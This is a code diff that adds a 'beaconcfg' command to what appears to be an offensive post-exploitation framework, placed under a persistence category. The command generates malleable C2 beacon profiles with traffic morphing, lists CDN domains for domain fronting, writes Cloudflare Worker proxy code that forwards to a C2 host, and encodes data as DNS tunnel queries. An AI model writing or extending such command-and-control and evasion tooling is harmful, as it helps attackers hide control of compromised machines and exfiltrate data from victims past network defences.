@@ -1400,6 +1400,72 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
 
         print_msg(f"Magic packet sent to {self.params['rhost']}:{rport}")
 
+    @cmd2.with_category("05. Persistence")
+    def do_beaconcfg(self, line: str) -> None:
+        """Generate a C2 beacon profile with traffic morphing and domain fronting.
+
+        Usage:
+            beaconcfg generate [name]        Generate a malleable C2 profile
+            beaconcfg cdn [provider]         List CDN domains for fronting
+            beaconcfg worker <c2_host> <c2_port> [token]  Generate Cloudflare Worker proxy
+            beaconcfg dns <data> <domain>    Encode data as DNS tunnel queries
+        """
+        from modules.traffic_morpher import TrafficMorpher
+
+        tm = TrafficMorpher()
+        parts = line.strip().split()
+        if not parts:
+            print_error("Usage: beaconcfg <generate|cdn|worker|dns> [args...]")
+            return
+
+        subcmd = parts[0].lower()
+
+        if subcmd == "generate":
+            name = parts[1] if len(parts) > 1 else "default"
+            protocol = parts[2] if len(parts) > 2 else "https"
+            profile = tm.generate_beacon_profile(name=name, protocol=protocol)
+            import json as _json
+
+            print_msg(_json.dumps(profile, indent=2))
+            path = f"sessions/beacon_profile_{name}.json"
+            with open(path, "w") as fh:
+                _json.dump(profile, fh, indent=2)
+            print_msg(f"Profile saved to {path}")
+
+        elif subcmd == "cdn":
+            provider = parts[1] if len(parts) > 1 else "cloudflare"
+            domains = tm.get_cdn_fronting_hosts(provider, count=5)
+            print_msg(f"CDN fronting domains ({provider}):")
+            for d in domains:
+                print_msg(f"  {d}")
+
+        elif subcmd == "worker":
+            if len(parts) < 3:
+                print_error("Usage: beaconcfg worker <c2_host> <c2_port> [auth_token]")
+                return
+            c2_host, c2_port = parts[1], int(parts[2])
+            token = parts[3] if len(parts) > 3 else None
+            code = tm.generate_cloudflare_worker_proxy_config(c2_host, c2_port, token)
+            print_msg(code)
+            path = f"sessions/cf_worker_{c2_host}.js"
+            with open(path, "w") as fh:
+                fh.write(code)
+            print_msg(f"Worker code saved to {path}")
+            print_msg("Deploy with: npx wrangler deploy")
+
+        elif subcmd == "dns":
+            if len(parts) < 2:
+                print_error("Usage: beaconcfg dns <data> [domain]")
+                return
+            data = parts[1].encode()
+            domain = parts[2] if len(parts) > 2 else "cdn.cloudflare.net"
+            queries = tm.generate_dns_tunnel_payload(data, domain)
+            for q in queries:
+                print_msg(q)
+
+        else:
+            print_error(f"Unknown subcommand: {subcmd}")
+
 
 import utils as _lazy_utils
 for _lazy_name in dir(_lazy_utils):
